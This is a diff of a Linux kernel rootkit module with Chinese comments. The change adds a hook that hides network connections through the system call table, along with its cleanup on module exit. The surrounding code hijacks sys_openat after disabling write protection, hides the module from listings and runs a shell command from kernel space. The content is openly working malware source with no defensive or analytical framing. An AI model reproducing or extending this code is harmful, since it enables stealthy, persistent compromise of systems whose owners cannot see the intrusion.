@@ -16,7 +16,12 @@ static int __init rootkit_init(void)
         pr_info("sys call table not found");
         return -EFAULT;
     }
-    //打印出系统调用表地址
+    if (!hide_connect_init(real_sys_call_table))
+    {
+         pr_info("hide_port_init fail!");
+         return -EFAULT;
+    }
+    // //打印出系统调用表地址
     pr_info("real_sys_call_table: %p", real_sys_call_table);
 
     // 获取真实的sys_openat函数地址
@@ -29,7 +34,7 @@ static int __init rootkit_init(void)
     
     // 恢复现场，打开写保护
     enable_wp();
-
+    
     pr_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);
 
     // 注册设备
@@ -68,14 +73,14 @@ static int __init rootkit_init(void)
     module_info();
     hide_myself();
     show_myself();
-    pr_info("Module install successful!!!\n");
+    pr_info("Module install successful##!\n");
     exec_cmd("echo 123 >> /tmp/result.txt");
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    // 模块退出的时候，需要恢复现场，将修改过的地址再改回去
+    // // 模块退出的时候，需要恢复现场，将修改过的地址再改回去
     disable_wp();
     real_sys_call_table[__NR_openat] = (void *)real_sys_openat;
     enable_wp();
@@ -83,6 +88,7 @@ static void __exit rootkit_exit(void)
     device_destroy(module_class, MKDEV(major_num, 0));
     class_destroy(module_class);
     unregister_chrdev(major_num, DEVICE_NAME);
+    hide_connect_exit(real_sys_call_table);
     pr_info("Module uninstall successful!\n");
 }
 
